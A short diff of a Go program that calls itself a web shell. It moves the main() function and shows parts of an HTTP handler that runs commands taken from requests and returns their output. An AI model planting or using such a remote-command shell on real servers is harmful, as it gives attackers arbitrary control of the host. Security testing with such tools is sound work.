@@ -26,6 +26,12 @@ func NewHandlers(logger *log.Logger) *Handlers {
 	}
 }
 
+func main() {
+	logger := log.New(os.Stdout, "webshell ", log.LstdFlags|log.Lshortfile|log.Ltime|log.LUTC)
+	s := NewHandlers(logger)
+	s.handleRequests()
+}
+
 func (h *Handlers) handleRequests() {
 	servicePort := os.Getenv("SERVICE_ADDR")
 	myRouter := mux.NewRouter()
@@ -120,10 +126,4 @@ func (h *Handlers) commandExecute(w http.ResponseWriter, r *http.Request) {
 	h.logger.Printf("Command: %s", command)
 	formattedOutput := fmt.Sprintf("\nMethod:\t\t%s\n%sResult:\n\n%s\n", r.Method, outputHeader, string(outCommand))
 	fmt.Fprintf(w, formattedOutput)
-}
-
-func main() {
-	logger := log.New(os.Stdout, "webshell ", log.LstdFlags|log.Lshortfile|log.Ltime|log.LUTC)
-	s := NewHandlers(logger)
-	s.handleRequests()
 }
